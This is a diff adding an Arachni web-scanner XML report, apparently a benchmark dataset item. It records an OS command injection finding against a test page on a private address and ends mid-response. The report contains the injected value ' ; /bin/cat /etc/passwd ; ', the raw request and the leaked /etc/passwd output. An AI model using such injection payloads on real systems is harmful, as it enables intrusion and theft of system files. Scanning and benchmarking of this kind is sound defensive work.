@@ -1,0 +1,814 @@
+<?xml version="1.0"?>
+<report xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="https://raw.githubusercontent.com/Arachni/arachni/v1.6.1.3/components/reporters/xml/schema.xsd">
+  <version>1.6.1.3</version>
+  <seed>629c06d8eb411903acde521764d19e09</seed>
+  <options>---
+browser_cluster:
+  local_storage: {}
+  session_storage: {}
+  wait_for_elements: {}
+  wait_for_timers: false
+  pool_size: 4
+  job_timeout: 60
+  worker_time_to_live: 250
+  ignore_images: false
+  screen_width: 1600
+  screen_height: 1200
+http:
+  user_agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3
+  request_timeout: 20000
+  request_redirect_limit: 5
+  request_concurrency: 10
+  request_queue_size: 50
+  request_headers: {}
+  response_max_size: 500000
+  cookies: {}
+  authentication_type: auto
+input:
+  values: {}
+  default_values:
+    name: arachni_name
+    user: arachni_user
+    usr: arachni_user
+    pass: 5543!%arachni_secret
+    txt: arachni_text
+    num: '132'
+    amount: '100'
+    mail: arachni@email.gr
+    account: '12'
+    id: '1'
+  without_defaults: false
+  force: false
+audit:
+  parameter_values: true
+  exclude_vector_patterns: []
+  include_vector_patterns: []
+  link_templates: []
+  links: true
+  forms: true
+  cookies: true
+  ui_inputs: true
+  ui_forms: true
+  jsons: true
+  xmls: true
+  nested_cookies: true
+scope:
+  directory_depth_limit: 10
+  auto_redundant_paths: 15
+  redundant_path_patterns: {}
+  dom_depth_limit: 4
+  exclude_file_extensions:
+  - gif
+  - bmp
+  - tif
+  - tiff
+  - jpg
+  - jpeg
+  - jpe
+  - pjpeg
+  - png
+  - ico
+  - psd
+  - xcf
+  - 3dm
+  - max
+  - svg
+  - eps
+  - drw
+  - ai
+  - asf
+  - rm
+  - mpg
+  - mpeg
+  - mpe
+  - 3gp
+  - 3g2
+  - avi
+  - flv
+  - mov
+  - mp4
+  - swf
+  - vob
+  - wmv
+  - aif
+  - mp3
+  - mpa
+  - ra
+  - wav
+  - wma
+  - mid
+  - m4a
+  - ogg
+  - flac
+  - zip
+  - zipx
+  - tar
+  - gz
+  - 7z
+  - rar
+  - bz2
+  - bin
+  - cue
+  - dmg
+  - iso
+  - mdf
+  - vcd
+  - raw
+  - exe
+  - apk
+  - app
+  - jar
+  - pkg
+  - deb
+  - rpm
+  - msi
+  - ttf
+  - otf
+  - woff
+  - woff2
+  - fon
+  - fnt
+  - css
+  - js
+  - pdf
+  - docx
+  - xlsx
+  - pptx
+  - odt
+  - odp
+  exclude_path_patterns: []
+  exclude_content_patterns: []
+  include_path_patterns: []
+  restrict_paths: []
+  extend_paths: []
+  url_rewrites: {}
+session: {}
+datastore:
+  report_path: "../dataset/ARACHNI/BenchmarkTest00824.afr"
+checks:
+- insecure_cross_domain_policy_access
+- backup_files
+- common_files
+- xst
+- origin_spoof_access_restriction_bypass
+- insecure_client_access_policy
+- captcha
+- http_only_cookies
+- insecure_cors_policy
+- credit_card
+- form_upload
+- html_objects
+- hsts
+- ssn
+- private_ip
+- x_frame_options
+- cookie_set_for_parent_domain
+- unencrypted_password_forms
+- mixed_resource
+- password_autocomplete
+- cvs_svn_users
+- insecure_cookies
+- emails
+- http_put
+- backup_directories
+- webdav
+- common_directories
+- directory_listing
+- interesting_responses
+- backdoors
+- localstart_asp
+- insecure_cross_domain_policy_headers
+- htaccess_limit
+- common_admin_interfaces
+- allowed_methods
+- code_injection_timing
+- code_injection_php_input_wrapper
+- no_sql_injection_differential
+- csrf
+- xss_tag
+- unvalidated_redirect_dom
+- session_fixation
+- xss_event
+- rfi
+- no_sql_injection
+- source_code_disclosure
+- path_traversal
+- sql_injection_timing
+- code_injection
+- trainer
+- os_cmd_injection
+- xss_dom_script_context
+- os_cmd_injection_timing
+- xss_path
+- xss_script_context
+- file_inclusion
+- ldap_injection
+- response_splitting
+- xpath_injection
+- xss
+- xxe
+- unvalidated_redirect
+- xss_dom
+- sql_injection_differential
+- sql_injection
+platforms: []
+plugins: {}
+no_fingerprinting: false
+authorized_by: 
+url: https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.
+</options>
+  <start_datetime>2025-05-29T04:11:54-07:00</start_datetime>
+  <finish_datetime>2025-05-29T04:12:09-07:00</finish_datetime>
+  <sitemap>
+    <entry url="https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=." code="200"/>
+  </sitemap>
+  <issues>
+    <issue>
+      <name>Operating system command injection</name>
+      <description>
+To perform specific actions from within a web application, it is occasionally
+required to run Operating System commands and have the output of these commands
+captured by the web application and returned to the client.
+
+OS command injection occurs when user supplied input is inserted into one of these
+commands without proper sanitisation and is then executed by the server.
+
+Cyber-criminals will abuse this weakness to perform their own arbitrary commands
+on the server. This can include everything from simple `ping` commands to map the
+internal network, to obtaining full control of the server.
+
+Arachni was able to inject specific Operating System commands and have the output
+from that command contained within the server response. This indicates that proper
+input sanitisation is not occurring.
+</description>
+      <remedy_guidance>
+It is recommended that untrusted data is never used to form a command to be
+executed by the OS.
+
+To validate data, the application should ensure that the supplied value contains
+only the characters that are required to perform the required action.
+
+For example, where the form field expects an IP address, only numbers and periods
+should be accepted. Additionally, all control operators (`&amp;`, `&amp;&amp;`, `|`, `||`,
+`$`, `\`, `#`) should be explicitly denied and never accepted as valid input by
+the server.
+</remedy_guidance>
+      <remedy_code/>
+      <severity>high</severity>
+      <check>
+        <name>OS command injection</name>
+        <description>
+Tries to find Operating System command injections.
+</description>
+        <author>Tasos "Zapotek" Laskos &lt;tasos.laskos@arachni-scanner.com&gt; </author>
+        <version>0.2.6</version>
+        <shortname>os_cmd_injection</shortname>
+      </check>
+      <cwe>78</cwe>
+      <digest>3565586091</digest>
+      <references>
+        <reference title="OWASP" url="https://www.owasp.org/index.php/OS_Command_Injection"/>
+        <reference title="WASC" url="http://projects.webappsec.org/w/page/13246950/OS%20Commanding"/>
+      </references>
+      <vector>
+        <class>Arachni::Element::Link</class>
+        <type>link</type>
+        <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+        <action>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824</action>
+        <source/>
+        <seed> ; /bin/cat /etc/passwd ; </seed>
+        <method>get</method>
+        <affected_input_name>BenchmarkTest00824</affected_input_name>
+        <inputs>
+          <input name="BenchmarkTest00824" value=" ; /bin/cat /etc/passwd ; "/>
+        </inputs>
+        <default_inputs>
+          <input name="BenchmarkTest00824" value="."/>
+        </default_inputs>
+      </vector>
+      <remarks/>
+      <page>
+        <body>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;
+Here is the standard output of the command:&lt;br&gt;benchmarkDataBase.lck&lt;br&gt;benchmarkDataBase.log&lt;br&gt;benchmarkDataBase.properties&lt;br&gt;benchmarkDataBase.script&lt;br&gt;benchmarkDataBase.tmp&lt;br&gt;boot.ini&lt;br&gt;common&lt;br&gt;conf&lt;br&gt;logs&lt;br&gt;shared&lt;br&gt;temp&lt;br&gt;testfiles&lt;br&gt;webapps&lt;br&gt;work&lt;br&gt;root&amp;#x3a;x&amp;#x3a;0&amp;#x3a;0&amp;#x3a;root&amp;#x3a;&amp;#x2f;root&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&lt;br&gt;daemon&amp;#x3a;x&amp;#x3a;1&amp;#x3a;1&amp;#x3a;daemon&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;bin&amp;#x3a;x&amp;#x3a;2&amp;#x3a;2&amp;#x3a;bin&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;sys&amp;#x3a;x&amp;#x3a;3&amp;#x3a;3&amp;#x3a;sys&amp;#x3a;&amp;#x2f;dev&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;sync&amp;#x3a;x&amp;#x3a;4&amp;#x3a;65534&amp;#x3a;sync&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;bin&amp;#x2f;sync&lt;br&gt;games&amp;#x3a;x&amp;#x3a;5&amp;#x3a;60&amp;#x3a;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;man&amp;#x3a;x&amp;#x3a;6&amp;#x3a;12&amp;#x3a;man&amp;#x3a;&amp;#x2f;var&amp;#x2f;cache&amp;#x2f;man&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;lp&amp;#x3a;x&amp;#x3a;7&amp;#x3a;7&amp;#x3a;lp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;lpd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;mail&amp;#x3a;x&amp;#x3a;8&amp;#x3a;8&amp;#x3a;mail&amp;#x3a;&amp;#x2f;var&amp;#x2f;mail&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;news&amp;#x3a;x&amp;#x3a;9&amp;#x3a;9&amp;#x3a;news&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;news&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;uucp&amp;#x3a;x&amp;#x3a;10&amp;#x3a;10&amp;#x3a;uucp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;uucp&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;proxy&amp;#x3a;x&amp;#x3a;13&amp;#x3a;13&amp;#x3a;proxy&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;www-data&amp;#x3a;x&amp;#x3a;33&amp;#x3a;33&amp;#x3a;www-data&amp;#x3a;&amp;#x2f;var&amp;#x2f;www&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;backup&amp;#x3a;x&amp;#x3a;34&amp;#x3a;34&amp;#x3a;backup&amp;#x3a;&amp;#x2f;var&amp;#x2f;backups&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;list&amp;#x3a;x&amp;#x3a;38&amp;#x3a;38&amp;#x3a;Mailing List Manager&amp;#x3a;&amp;#x2f;var&amp;#x2f;list&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;irc&amp;#x3a;x&amp;#x3a;39&amp;#x3a;39&amp;#x3a;ircd&amp;#x3a;&amp;#x2f;var&amp;#x2f;run&amp;#x2f;ircd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;gnats&amp;#x3a;x&amp;#x3a;41&amp;#x3a;41&amp;#x3a;Gnats Bug-Reporting System &amp;#x28;admin&amp;#x29;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;gnats&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;nobody&amp;#x3a;x&amp;#x3a;65534&amp;#x3a;65534&amp;#x3a;nobody&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-network&amp;#x3a;x&amp;#x3a;100&amp;#x3a;102&amp;#x3a;systemd Network Management,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-resolve&amp;#x3a;x&amp;#x3a;101&amp;#x3a;103&amp;#x3a;systemd Resolver,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-timesync&amp;#x3a;x&amp;#x3a;102&amp;#x3a;104&amp;#x3a;systemd Time Synchronization,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;messagebus&amp;#x3a;x&amp;#x3a;103&amp;#x3a;106&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;syslog&amp;#x3a;x&amp;#x3a;104&amp;#x3a;110&amp;#x3a;&amp;#x3a;&amp;#x2f;home&amp;#x2f;syslog&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;_apt&amp;#x3a;x&amp;#x3a;105&amp;#x3a;65534&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;tss&amp;#x3a;x&amp;#x3a;106&amp;#x3a;111&amp;#x3a;TPM software stack,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;tpm&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;uuidd&amp;#x3a;x&amp;#x3a;107&amp;#x3a;114&amp;#x3a;&amp;#x3a;&amp;#x2f;run&amp;#x2f;uuidd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;tcpdump&amp;#x3a;x&amp;#x3a;108&amp;#x3a;115&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;avahi-autoipd&amp;#x3a;x&amp;#x3a;109&amp;#x3a;116&amp;#x3a;Avahi autoip daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;avahi-autoipd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;usbmux&amp;#x3a;x&amp;#x3a;110&amp;#x3a;46&amp;#x3a;usbmux daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;usbmux&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;rtkit&amp;#x3a;x&amp;#x3a;111&amp;#x3a;117&amp;#x3a;RealtimeKit,,,&amp;#x3a;&amp;#x2f;proc&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;dnsmasq&amp;#x3a;x&amp;#x3a;112&amp;#x3a;65534&amp;#x3a;dnsmasq,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;misc&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;cups-pk-helper&amp;#x3a;x&amp;#x3a;113&amp;#x3a;120&amp;#x3a;user for cups-pk-helper service,,,&amp;#x3a;&amp;#x2f;home&amp;#x2f;cups-pk-helper&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;speech-dispatcher&amp;#x3a;x&amp;#x3a;114&amp;#x3a;29&amp;#x3a;Speech Dispatcher,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;speech-dispatcher&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;avahi&amp;#x3a;x&amp;#x3a;115&amp;#x3a;121&amp;#x3a;Avahi mDNS daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;run&amp;#x2f;avahi-daemon&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;kernoops&amp;#x3a;x&amp;#x3a;116&amp;#x3a;65534&amp;#x3a;Kernel Oops Tracking Daemon,,,&amp;#x3a;&amp;#x2f;&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;saned&amp;#x3a;x&amp;#x3a;117&amp;#x3a;123&amp;#x3a;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;saned&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;nm-openvpn&amp;#x3a;x&amp;#x3a;118&amp;#x3a;124&amp;#x3a;NetworkManager OpenVPN,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;openvpn&amp;#x2f;chroot&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;hplip&amp;#x3a;x&amp;#x3a;119&amp;#x3a;7&amp;#x3a;HPLIP system user,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;hplip&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;whoopsie&amp;#x3a;x&amp;#x3a;120&amp;#x3a;125&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;colord&amp;#x3a;x&amp;#x3a;121&amp;#x3a;126&amp;#x3a;colord colour management daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;colord&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;fwupd-refresh&amp;#x3a;x&amp;#x3a;122&amp;#x3a;127&amp;#x3a;fwupd-refresh user,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;geoclue&amp;#x3a;x&amp;#x3a;123&amp;#x3a;128&amp;#x3a;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;geoclue&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;pulse&amp;#x3a;x&amp;#x3a;124&amp;#x3a;129&amp;#x3a;PulseAudio daemon,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;run&amp;#x2f;pulse&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;gnome-initial-setup&amp;#x3a;x&amp;#x3a;125&amp;#x3a;65534&amp;#x3a;&amp;#x3a;&amp;#x2f;run&amp;#x2f;gnome-initial-setup&amp;#x2f;&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;gdm&amp;#x3a;x&amp;#x3a;126&amp;#x3a;131&amp;#x3a;Gnome Display Manager&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;gdm3&amp;#x3a;&amp;#x2f;bin&amp;#x2f;false&lt;br&gt;sssd&amp;#x3a;x&amp;#x3a;127&amp;#x3a;132&amp;#x3a;SSSD system user,,,&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;sss&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;huy&amp;#x3a;x&amp;#x3a;1000&amp;#x3a;1000&amp;#x3a;huy,,,&amp;#x3a;&amp;#x2f;home&amp;#x2f;huy&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&lt;br&gt;systemd-coredump&amp;#x3a;x&amp;#x3a;999&amp;#x3a;999&amp;#x3a;systemd Core Dumper&amp;#x3a;&amp;#x2f;&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;&lt;br&gt;Here is the std err of the command (if any):&lt;br&gt;</body>
+        <request>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824</url>
+          <method>get</method>
+          <parameters>
+            <parameter name="BenchmarkTest00824" value=" ; /bin/cat /etc/passwd ; "/>
+          </parameters>
+          <headers>
+            <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
+            <header name="User-Agent" value="Mozilla/5.0 (Gecko) Arachni/v1.6.1.3"/>
+            <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6"/>
+            <header name="X-Arachni-Scan-Seed" value="629c06d8eb411903acde521764d19e09"/>
+          </headers>
+          <body/>
+          <raw>GET /benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=%20%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd%20%3B%20 HTTP/1.1&#xD;
+Host: 192.168.6.149:8443&#xD;
+Accept-Encoding: gzip, deflate&#xD;
+User-Agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3&#xD;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+X-Arachni-Scan-Seed: 629c06d8eb411903acde521764d19e09&#xD;
+&#xD;
+</raw>
+        </request>
+        <response>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=%20;%20/bin/cat%20/etc/passwd%20;%20</url>
+          <code>200</code>
+          <ip_address>192.168.6.149</ip_address>
+          <time>0.0947</time>
+          <return_code>ok</return_code>
+          <return_message>No error</return_message>
+          <headers>
+            <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com"/>
+            <header name="Cache-Control" value="no-cache, no-store, must-revalidate"/>
+            <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains"/>
+            <header name="X-Frame-Options" value="DENY"/>
+            <header name="X-Content-Type-Options" value="nosniff"/>
+            <header name="Content-Type" value="text/html;charset=UTF-8"/>
+            <header name="Content-Length" value="6185"/>
+            <header name="Date" value="Thu, 29 May 2025 11:12:07 GMT"/>
+          </headers>
+          <body>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;
+Here is the standard output of the command:&lt;br&gt;benchmarkDataBase.lck&lt;br&gt;benchmarkDataBase.log&lt;br&gt;benchmarkDataBase.properties&lt;br&gt;benchmarkDataBase.script&lt;br&gt;benchmarkDataBase.tmp&lt;br&gt;boot.ini&lt;br&gt;common&lt;br&gt;conf&lt;br&gt;logs&lt;br&gt;shared&lt;br&gt;temp&lt;br&gt;testfiles&lt;br&gt;webapps&lt;br&gt;work&lt;br&gt;root&amp;#x3a;x&amp;#x3a;0&amp;#x3a;0&amp;#x3a;root&amp;#x3a;&amp;#x2f;root&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&lt;br&gt;daemon&amp;#x3a;x&amp;#x3a;1&amp;#x3a;1&amp;#x3a;daemon&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;bin&amp;#x3a;x&amp;#x3a;2&amp;#x3a;2&amp;#x3a;bin&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;sys&amp;#x3a;x&amp;#x3a;3&amp;#x3a;3&amp;#x3a;sys&amp;#x3a;&amp;#x2f;dev&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;sync&amp;#x3a;x&amp;#x3a;4&amp;#x3a;65534&amp;#x3a;sync&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;bin&amp;#x2f;sync&lt;br&gt;games&amp;#x3a;x&amp;#x3a;5&amp;#x3a;60&amp;#x3a;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;man&amp;#x3a;x&amp;#x3a;6&amp;#x3a;12&amp;#x3a;man&amp;#x3a;&amp;#x2f;var&amp;#x2f;cache&amp;#x2f;man&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;lp&amp;#x3a;x&amp;#x3a;7&amp;#x3a;7&amp;#x3a;lp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;lpd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;mail&amp;#x3a;x&amp;#x3a;8&amp;#x3a;8&amp;#x3a;mail&amp;#x3a;&amp;#x2f;var&amp;#x2f;mail&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;news&amp;#x3a;x&amp;#x3a;9&amp;#x3a;9&amp;#x3a;news&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;news&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;uucp&amp;#x3a;x&amp;#x3a;10&amp;#x3a;10&amp;#x3a;uucp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;uucp&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;proxy&amp;#x3a;x&amp;#x3a;13&amp;#x3a;13&amp;#x3a;proxy&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;www-data&amp;#x3a;x&amp;#x3a;33&amp;#x3a;33&amp;#x3a;www-data&amp;#x3a;&amp;#x2f;var&amp;#x2f;www&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;backup&amp;#x3a;x&amp;#x3a;34&amp;#x3a;34&amp;#x3a;backup&amp;#x3a;&amp;#x2f;var&amp;#x2f;backups&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;list&amp;#x3a;x&amp;#x3a;38&amp;#x3a;38&amp;#x3a;Mailing List Manager&amp;#x3a;&amp;#x2f;var&amp;#x2f;list&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;irc&amp;#x3a;x&amp;#x3a;39&amp;#x3a;39&amp;#x3a;ircd&amp;#x3a;&amp;#x2f;var&amp;#x2f;run&amp;#x2f;ircd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;gnats&amp;#x3a;x&amp;#x3a;41&amp;#x3a;41&amp;#x3a;Gnats Bug-Reporting System &amp;#x28;admin&amp;#x29;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;gnats&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;nobody&amp;#x3a;x&amp;#x3a;65534&amp;#x3a;65534&amp;#x3a;nobody&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-network&amp;#x3a;x&amp;#x3a;100&amp;#x3a;102&amp;#x3a;systemd Network Management,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-resolve&amp;#x3a;x&amp;#x3a;101&amp;#x3a;103&amp;#x3a;systemd Resolver,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-timesync&amp;#x3a;x&amp;#x3a;102&amp;#x3a;104&amp;#x3a;systemd Time Synchronization,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;messagebus&amp;#x3a;x&amp;#x3a;103&amp;#x3a;106&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;syslog&amp;#x3a;x&amp;#x3a;104&amp;#x3a;110&amp;#x3a;&amp;#x3a;&amp;#x2f;home&amp;#x2f;syslog&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;_apt&amp;#x3a;x&amp;#x3a;105&amp;#x3a;65534&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;tss&amp;#x3a;x&amp;#x3a;106&amp;#x3a;111&amp;#x3a;TPM software 